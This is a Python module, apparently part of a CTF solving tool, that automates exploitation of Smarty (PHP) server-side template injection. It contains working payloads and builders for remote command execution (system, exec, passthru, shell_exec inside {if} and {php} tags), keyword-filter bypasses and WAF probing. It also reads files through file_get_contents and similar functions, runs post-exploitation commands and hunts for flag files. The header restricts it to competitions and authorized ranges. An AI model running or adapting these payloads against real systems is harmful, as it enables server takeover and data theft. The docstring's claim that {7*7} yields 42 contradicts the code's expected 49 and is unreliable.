"""
CTF 解题工具 — Smarty 引擎模块
用途: 面向 CTF 竞赛的 Smarty (PHP) SSTI 自动化解题辅助
场景: 竞赛平台题目 / 授权测试靶场

特点:
  - {if} 标签支持全部 PHP 表达式和函数，是最稳定的利用方式
  - 函数名变体 (system/passthru/exec/shell_exec) 天然绕过关键字过滤
  - {php} 标签仅 Smarty2/SmartyBC 可用
  - 检测用 {7*7}→42（注意不是49，Smarty 用单花括号）
"""

from .base import BaseEngine
from .utils import is_waf_blocked


BYPASS_STRATEGIES = [
    {
        'name': '无过滤（{if} 标签）',
        'filters': set(),
        'rce': '{system("CMD")}',
        'file_read': '{file_get_contents("FILEPATH")}',
    },
    {
        'name': '过滤 system 关键字（函数名变体）',
        'filters': {'keyword'},
        'rce': 'smarty_func_bypass',
        'file_read': None,
    },
]


class SmartyEngine(BaseEngine):
    """Smarty (PHP) SSTI 引擎"""

    name = 'smarty'
    template_tags = ('{', '}')
    error_keywords = [
        'Fatal error', 'Parse error', 'Uncaught Exception',
        'SmartyCompilerException', 'Smarty error',
        'Internal Server Error',
    ]

    detect_payloads = [
        {'payload': '{7*7}', 'expected': '49', 'engines': ['smarty']},
    ]

    fingerprints = [
        {"payload": "{$smarty.version}", "expected": "", "desc": "Smarty 版本信息"},
        {"payload": "{7*7}", "expected": "49", "desc": "Smarty 基本运算"},
    ]

    rce_chains = [
        '{system("CMD")}',
        '{exec("CMD")}',
        '{passthru("CMD")}',
        '{shell_exec("CMD")}',
    ]

    file_read_chains = [
        '{file_get_contents("FILEPATH")}',
    ]

    bypass_strategies = BYPASS_STRATEGIES

    PHP_RCE_FUNCTIONS = ['system', 'exec', 'passthru', 'shell_exec', 'popen', 'proc_open']
    PHP_FILE_FUNCTIONS = ['file_get_contents', 'readfile', 'fread', 'file', 'show_source']

    def probe_waf(self, toolkit):
        """Smarty WAF 探测"""
        filters = set()
        filtered_keywords = set()

        # 确认基础 SSTI
        t = toolkit.send_and_clean('{7*7}')
        if '49' not in t:
            return filters, filtered_keywords

        # 空格
        t = toolkit.send_and_clean('{7 * 7}')
        if '49' not in t:
            filters.add('space')

        # PHP 函数名过滤探测
        for func in self.PHP_RCE_FUNCTIONS:
            payload = f'{{{func}("id")}}'
            t = toolkit.send_and_clean(payload)
            if is_waf_blocked(t):
                filtered_keywords.add(func)

        if filtered_keywords:
            filters.add('keyword')

        # {if} 标签可用性
        t = toolkit.send_and_clean('{if 1}yes{/if}')
        if is_waf_blocked(t) or 'yes' not in t:
            filters.add('if_tag')

        # {php} 标签可用性 (仅 Smarty2)
        t = toolkit.send_and_clean('{php}echo 42;{/php}')
        if not is_waf_blocked(t) and '42' in t:
            print("  [+] {php} 标签可用 (Smarty2/SmartyBC)")

        self.waf_filters = filters
        self.filtered_keywords = filtered_keywords
        return filters, filtered_keywords

    def build_rce_payload(self, cmd, toolkit=None):
        """Smarty RCE payload — {if} 标签 + 函数名变体"""
        strategy = getattr(toolkit, 'working_bypass', None) if toolkit else None

        if strategy and strategy['rce'] == 'smarty_func_bypass':
            # 逐个尝试未过滤的 PHP 函数
            for func in self.PHP_RCE_FUNCTIONS:
                if func in self.filtered_keywords:
                    continue
                return f'{{{func}("{cmd}")}}', None
            # 尝试 {if} 标签内调用
            for func in self.PHP_RCE_FUNCTIONS:
                if func in self.filtered_keywords:
                    continue
                return f'{{if {func}("{cmd}")}}{{/if}}', None
            return None, None

        if strategy and isinstance(strategy['rce'], str) and 'CMD' in strategy['rce']:
            return strategy['rce'].replace('CMD', cmd), None

        # 默认: 尝试 {if} 标签法（最通用）
        for func in self.PHP_RCE_FUNCTIONS:
            if func in self.filtered_keywords:
                continue
            return f'{{if {func}("{cmd}")}}{{/if}}', None

        for chain in self.rce_chains:
            return chain.replace('CMD', cmd), None
        return None, None

    def build_file_payload(self, filepath, toolkit=None):
        """Smarty 文件读取 payload"""
        for func in self.PHP_FILE_FUNCTIONS:
            if func in self.filtered_keywords:
                continue
            return f'{{{func}("{filepath}")}}', None
        # {if} 标签内读文件
        for func in self.PHP_FILE_FUNCTIONS:
            if func in self.filtered_keywords:
                continue
            return f'{{if print({func}("{filepath}"))}}{{/if}}', None
        for chain in self.file_read_chains:
            return chain.replace('FILEPATH', filepath), None
        return None, None

    def is_rce_output(self, text, cmd, toolkit=None):
        if not text or len(text) < 2:
            return False
        if is_waf_blocked(text):
            return False
        # Smarty 标签残留检查（单花括号太常见，仅检查特定模式）
        if '{system' in text or '{exec' in text or '{if ' in text:
            return False
        for kw in self.error_keywords:
            if kw in text:
                return False
        if cmd == 'id':
            return 'uid=' in text or 'gid=' in text
        return len(text) > 0

    def info_gathering(self, toolkit):
        """Smarty 信息收集"""
        print("\n" + "=" * 60)
        print("[*] 信息收集 (Smarty)")
        print("=" * 60)

        # Smarty 版本
        text = toolkit.send_and_clean('{$smarty.version}')
        if text and not is_waf_blocked(text):
            print(f"  Smarty 版本: {text}")

        # PHP 信息
        text = toolkit.send_and_clean('{phpinfo()}')
        if text and not is_waf_blocked(text) and 'PHP Version' in text:
            print(f"  PHP 信息可用")

        # 通过 RCE 收集
        if toolkit.working_chain:
            print("\n  [1] 系统信息 (通过 RCE):")
            output = toolkit.exec_cmd('id')
            if output:
                print(f"      {output[:300]}")

            print("\n  [2] 寻找 flag 文件:")
            output = toolkit.exec_cmd('find / -name "flag*" -type f 2>/dev/null | head -20')
            if output:
                print(f"      {output[:500]}")
            output = toolkit.exec_cmd('cat /flag 2>/dev/null; cat /flag.txt 2>/dev/null')
            if output:
                print(f"      [+] flag: {output}")
